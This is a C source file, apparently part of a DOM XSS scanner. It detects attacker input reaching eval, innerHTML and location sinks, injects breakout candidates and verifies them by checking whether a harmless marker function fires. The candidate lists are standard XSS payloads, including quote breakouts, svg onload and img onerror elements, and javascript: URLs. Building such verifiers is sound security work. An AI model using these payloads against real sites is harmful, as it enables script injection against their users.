/* @S solver — see solve.h. Forced-exec candidate: derive the breakout from the sink's lexical CONTEXT, inject
   it at the source, re-run the REAL code, and verify it FIRES. */
#include "solver/solve.h"
#include "solver/concolic.h"
#include "solver/endpoint.h"
#include "solver/engine.h"
#include "solver/flow.h"
#include "check.h"
#include <lexbor/html/html.h>
#include <lexbor/dom/dom.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

enum { SINK_EVAL = 0, SINK_HTML = 1, SINK_URL = 2 };   /* JS / HTML / URL context -> different candidate set + fire oracle */

/* THE RUNNING FLOW's fire flag and candidate mode. These were file-scope globals, which is only correct while
   one candidate runs start-to-finish with nothing else scheduled — the shape the verify driver has and the BFS
   does not. Reached through the running flow so a preemption cannot cross them. A NULL flow (baseline setup)
   has neither, and the accessors say so rather than inventing a value. */
static int *fired_slot(void)     { Flow *f = flow_running(); return f ? &f->cand_fired : NULL; }
static int  is_verifying(void)   { Flow *f = flow_running(); return f && f->cand_verifying; }
static void set_fired(void)      { int *p = fired_slot(); if (p) *p = 1; }

/* A detected sink awaiting fire-verification. `seeded` is per SINK, not per session: a sink discovered late —
   inside a lazily-imported chunk, inside an injected <script src> — is discovered after the frontier has already
   drained once, and a one-shot "the candidates are seeded" latch meant it never got any. That latch was a cap:
   it bounded verification by WHEN a sink was found rather than by whether it had been searched. */
typedef struct { char *src; int sink; int seeded; } Cand;
static Cand *g_pending = NULL; static int g_pending_n = 0, g_pending_cap = 0;

typedef struct { char *sink; char *source; char *poc; } Finding;   /* verified PoCs only */
static Finding *g_sinks = NULL; static int g_sinks_n = 0, g_sinks_cap = 0;

static JSValue js_x9(JSContext *ctx, JSValueConst t, int c, JSValueConst *v) { (void)ctx; (void)t; (void)c; (void)v; set_fired(); return JS_UNDEFINED; }

/* THE FIRE. A sink executes attacker-shaped code — `eval(s)`, a `javascript:` navigation, an auto-firing event
   handler in re-parsed HTML — and that code is the PAGE's, so it can hold a loop, an await, a recursion. Running
   it with JS_Eval from C entered a bytecode body below the live candidate flow, where it cannot suspend: the
   engine's own DFAIL named it a drive-to-completion, and the whole @S verification was built on one.
   The sunk code is simply MORE CODE IN THIS FLOW — the same thing a lazy chunk is — so it is queued as another
   program of the running flow and the ONE BFS runs it, preemptible and parkable like every other. The candidate
   re-run drains its queue before finishing, so the flow's own fire flag still answers when it completes. */
static void fire_js(const char *src, size_t len) {
    char *body = malloc(len + 1);
    CHECK(body, "solve: OOM queueing a fired PoC body");
    memcpy(body, src, len); body[len] = 0;
    engine_queue_script(body);
    free(body);
}

void solve_init(JSContext *ctx) {
    g_pending = NULL; g_pending_n = g_pending_cap = 0;
    g_sinks = NULL; g_sinks_n = g_sinks_cap = 0;
    JSValue g = JS_GetGlobalObject(ctx);
    JS_SetPropertyStr(ctx, g, "X9", JS_NewCFunction(ctx, js_x9, "X9", 0));
    JS_FreeValue(ctx, g);
}

/* Breakout CANDIDATES — one per common JS context. We do NOT statically detect which context applies (that
   needs a JS lexer + loses to filters/encoders the code may apply); instead we try each through the REAL code
   and the one that FIRES is the verified PoC. Re-execution is the oracle, so this survives any quoting/filter
   the code imposes and needs no lexer. */
static const char *CANDS_JS[] = {
    "X9()",           /* statement / expression position — the input runs directly */
    "';X9();//",      /* single-quoted string context */
    "\";X9();//",     /* double-quoted string context */
    "`;X9();//",      /* template-literal context */
    "${X9()}",        /* template interpolation */
    NULL
};
static const char *CANDS_HTML[] = {
    "<svg onload=X9()>",           /* HTML-text context: an auto-firing element */
    "<img src=x onerror=X9()>",    /* HTML-text: img onerror fires on the bad src */
    "\"><svg onload=X9()>",        /* break out of a double-quoted attribute, then a firing element */
    "'><svg onload=X9()>",         /* single-quoted attribute */
    "></textarea><svg onload=X9()>", /* rawtext element (textarea/title/...) — close it first */
    NULL
};
static const char *CANDS_URL[] = {
    "javascript:X9()",     /* URL context: the vector IS the javascript: scheme (one fixed context) */
    "javascript:X9()//",
    NULL
};
static const char **cand_set(int sink) {
    return sink == SINK_HTML ? CANDS_HTML : sink == SINK_URL ? CANDS_URL : CANDS_JS;
}

static void add_pending(const char *src, int sink) {
    for (int i = 0; i < g_pending_n; i++) if (g_pending[i].sink == sink && !strcmp(g_pending[i].src, src)) return;   /* dedup */
    if (g_pending_n >= g_pending_cap) { g_pending_cap = g_pending_cap ? g_pending_cap * 2 : 8; g_pending = realloc(g_pending, (size_t)g_pending_cap * sizeof(Cand)); CHECK(g_pending, "solve: OOM pending"); }
    /* EVERY field, because the array is realloc'd and never zeroed: leaving `seeded` as whatever the allocator
       held made a sink look already-searched and it got no candidate at all. */
    g_pending[g_pending_n].src = strdup(src);
    g_pending[g_pending_n].sink = sink;
    g_pending[g_pending_n].seeded = 0;
    g_pending_n++;
    flow_credit_emit(1.0);   /* a NEW attacker-source-reaches-sink: value-of-information for the running flow */
}

static void record_sink(const char *sink, const char *source, const char *poc) {
    for (int i = 0; i < g_sinks_n; i++) if (!strcmp(g_sinks[i].sink, sink) && !strcmp(g_sinks[i].source, source)) return;
    if (g_sinks_n >= g_sinks_cap) { g_sinks_cap = g_sinks_cap ? g_sinks_cap * 2 : 8; g_sinks = realloc(g_sinks, (size_t)g_sinks_cap * sizeof(Finding)); CHECK(g_sinks, "solve: OOM @S store"); }
    Finding *f = &g_sinks[g_sinks_n++];
    f->sink = strdup(sink); f->source = strdup(source ? source : "?"); f->poc = strdup(poc);
}

void solve_eval_sink(JSContext *ctx, JSValueConst arg) {
    if (is_verifying()) {                          /* candidate run: the arg is the injected+wrapped CONCRETE code */
        if (concolic_is(arg)) return;           /* injection didn't reach this read -> not our candidate */
        const char *code = JS_ToCString(ctx, arg);
        if (code) { fire_js(code, strlen(code)); JS_FreeCString(ctx, code); }
        return;                                 /* g_fired reflects the PoC once this flow drains its queue */
    }
    if (!concolic_is(arg)) return;              /* detection: not an attacker source -> not a sink */
    const char *shape = concolic_shape_c(arg);
    const char *src = concolic_src_c(arg);
    add_pending(src ? src : (shape ? shape : "?"), SINK_EVAL);   /* record the source; breakout SEARCHED at verify */
}

/* HTML firing oracle: re-parse the sink output with the REAL Lexbor parser and FIRE the auto-firing event
   handlers (svg/body onload, img/script onerror) by eval'ing their JS — X9 fires iff a breakout placed
   executable JS in an auto-firing position. innerHTML does NOT run <script>, so those never fire (correct). */
/* THE TREE'S DEPTH IS THE CANDIDATE'S DATA — a breakout that nests `<div>` a million times is exactly the kind
   of input this walk exists to run — so descending by C frame made the oracle's own depth attacker-controlled.
   Lexbor's nodes carry `parent`, so the traversal needs no stack at all: descend to first_child, else take
   `next`, else climb until a `next` exists, never above the level the walk started at. */
static void html_fire_walk(lxb_dom_node_t *node) {
    lxb_dom_node_t *top = node->parent;   /* the level the walk must not climb above */
    lxb_dom_node_t *n = node;

    while (n) {
        if (n->type == LXB_DOM_NODE_TYPE_ELEMENT) {
            lxb_dom_element_t *el = lxb_dom_interface_element(n);
            static const char *H[] = { "onload", "onerror", NULL };   /* AUTO-firing only (onmouseover needs interaction) */
            for (int h = 0; H[h]; h++) {
                size_t vl = 0;
                const lxb_char_t *v = lxb_dom_element_get_attribute(el, (const lxb_char_t *)H[h], strlen(H[h]), &vl);
                if (v && vl) fire_js((const char *)v, vl);
            }
        }
        if (n->first_child) { n = n->first_child; continue; }
        while (n && !n->next) {
            n = n->parent;
            if (n == top) n = NULL;
        }
        if (n) n = n->next;
    }
}
static void html_fire(const char *html) {
    lxb_html_document_t *doc = lxb_html_document_create();
    if (!doc) return;
    if (lxb_html_document_parse(doc, (const lxb_char_t *)html, strlen(html)) == LXB_STATUS_OK) {
        lxb_dom_element_t *root = lxb_dom_document_element(&doc->dom_document);
        if (root) html_fire_walk(lxb_dom_interface_node(root));
    }
    lxb_html_document_destroy(doc);
}

/* URL firing oracle: navigating to a `javascript:` URL executes its JS. So the "fire" is: if the URL scheme is
   javascript:, eval the part after the colon — X9 fires iff the breakout made the URL a javascript: one. */
static void url_fire(JSContext *ctx, const char *url) {
    while (*url == ' ' || *url == '\t' || *url == '\n') url++;   /* leading whitespace is ignored by the URL parser */
    if (!strncasecmp(url, "javascript:", 11)) {
        const char *js = url + 11;
        fire_js(js, strlen(js));
    }
}
/* location = arg (or el.href = arg): a URL-context sink. */
void solve_url_sink(JSContext *ctx, JSValueConst arg) {
    if (is_verifying()) {
        if (concolic_is(arg)) return;
        const char *url = JS_ToCString(ctx, arg);
        if (url) { url_fire(ctx, url); JS_FreeCString(ctx, url); }
        return;
    }
    if (!concolic_is(arg)) return;
    const char *shape = concolic_shape_c(arg);
    const char *src = concolic_src_c(arg);
    add_pending(src ? src : (shape ? shape : "?"), SINK_URL);
}

/* innerHTML = arg: an HTML-context sink. Detection records the source; the candidate run re-parses the injected
   HTML and fires its handlers. */
void solve_html_sink(JSContext *ctx, JSValueConst arg) {
    if (is_verifying()) {
        if (concolic_is(arg)) return;   /* injection didn't reach this write */
        const char *html = JS_ToCString(ctx, arg);
        if (html) { html_fire(html); JS_FreeCString(ctx, html); }
        return;
    }
    if (!concolic_is(arg)) return;
    const char *shape = concolic_shape_c(arg);
    const char *src = concolic_src_c(arg);
    add_pending(src ? src : (shape ? shape : "?"), SINK_HTML);
}

/* Fire-verify every pending source: SEARCH the candidate breakouts — inject each at the source, re-run the
   REAL program as a flow, and the FIRST that makes X9 fire is the replay-verified PoC (re-execution is the
   oracle, so no static context detection is needed). The re-run is a FLOW on the one frontier,
   the same path the scheduler uses — there is no separate boot re-runner. */
/* SEED the candidate flows: one per (detected sink, breakout), each an ordinary member of the ONE frontier.
   The scheduler runs them preemptibly and parkably like every other flow, which is what §solver requires — a
   driver that runs a candidate start-to-finish cannot park an unbounded loop inside it. */
/* Seed a candidate flow per (sink, breakout) for every sink NOT YET SEEDED, and answer how many were added.
   Idempotent by construction, so the scheduler can ask again every time the frontier drains — which is what a
   sink found by code that only loaded after the first drain needs. */
int solve_seed_candidates(JSContext *ctx) {
    int added = 0;
    for (int i = 0; i < g_pending_n; i++) {
        const char **cands;
        if (g_pending[i].seeded) continue;
        g_pending[i].seeded = 1;
        cands = cand_set(g_pending[i].sink);
        const char *sink_name = g_pending[i].sink == SINK_HTML ? "innerHTML"
                              : g_pending[i].sink == SINK_URL  ? "location" : "eval";
        for (int c = 0; cands[c]; c++) {
            Flow *f = flow_add(ctx, JS_UNDEFINED, NULL, 0);
            f->cand_src     = strdup(g_pending[i].src);
            f->cand_payload = strdup(cands[c]);
            f->cand_sink    = sink_name;
            CHECK(f->cand_src && f->cand_payload, "solve: OOM seeding a candidate flow");
            added++;
        }
    }
    return added;
}

/* Bracket the substitution around THIS flow's dispatch. The candidate is live only while its own flow runs, so
   an ordinary flow scheduled in between is unaffected; the fire flag is the flow's, so a marker fired by one
   candidate cannot be read as another's. */
void solve_flow_begin(Flow *f) {
    if (!f || !f->cand_src) return;
    endpoint_suppress(1);
    concolic_set_candidate(f->cand_src, f->cand_payload);
    f->cand_verifying = 1;
}

void solve_flow_end(Flow *f) {
    if (!f || !f->cand_src) return;
    f->cand_verifying = 0;
    concolic_set_candidate(NULL, NULL);
    endpoint_suppress(0);
    if (f->cand_fired)
        record_sink(f->cand_sink, f->cand_src, f->cand_payload);
}

/* ── @S JSON emit (C-native) ── */
typedef struct { char *b; size_t n, cap; } Buf;
static void buf_ensure(Buf *b, size_t extra) { if (b->n + extra + 1 <= b->cap) return; while (b->n + extra + 1 > b->cap) b->cap = b->cap ? b->cap * 2 : 256; b->b = realloc(b->b, b->cap); CHECK(b->b, "solve: OOM JSON"); }
static void buf_puts(Buf *b, const char *s) { size_t l = strlen(s); buf_ensure(b, l); memcpy(b->b + b->n, s, l); b->n += l; }
static void buf_json_str(Buf *b, const char *s) {
    buf_ensure(b, 1); b->b[b->n++] = '"';
    for (; *s; s++) { unsigned char c = (unsigned char)*s;
        if (c == '"' || c == '\\') { buf_ensure(b, 2); b->b[b->n++] = '\\'; b->b[b->n++] = (char)c; }
        else if (c == '\n') buf_puts(b, "\\n"); else if (c == '\r') buf_puts(b, "\\r"); else if (c == '\t') buf_puts(b, "\\t");
        else if (c < 0x20) { char t[8]; snprintf(t, sizeof t, "\\u%04x", c); buf_puts(b, t); }
        else { buf_ensure(b, 1); b->b[b->n++] = (char)c; } }
    buf_ensure(b, 1); b->b[b->n++] = '"';
}
char *solve_json_array(void) {
    Buf b = { 0 };
    buf_puts(&b, "[");
    for (int i = 0; i < g_sinks_n; i++) {
        if (i) buf_puts(&b, ",");
        buf_puts(&b, "{\"sink\":"); buf_json_str(&b, g_sinks[i].sink);
        buf_puts(&b, ",\"source\":"); buf_json_str(&b, g_sinks[i].source);
        buf_puts(&b, ",\"poc\":"); buf_json_str(&b, g_sinks[i].poc);
        buf_puts(&b, "}");
    }
    buf_puts(&b, "]");
    buf_ensure(&b, 1); b.b[b.n] = 0;
    return b.b;
}

int solve_count(void) { return g_sinks_n; }

void solve_free(void) {
    for (int i = 0; i < g_pending_n; i++) free(g_pending[i].src);
    free(g_pending); g_pending = NULL; g_pending_n = g_pending_cap = 0;
    for (int i = 0; i < g_sinks_n; i++) { free(g_sinks[i].sink); free(g_sinks[i].source); free(g_sinks[i].poc); }
    free(g_sinks); g_sinks = NULL; g_sinks_n = g_sinks_cap = 0;
}
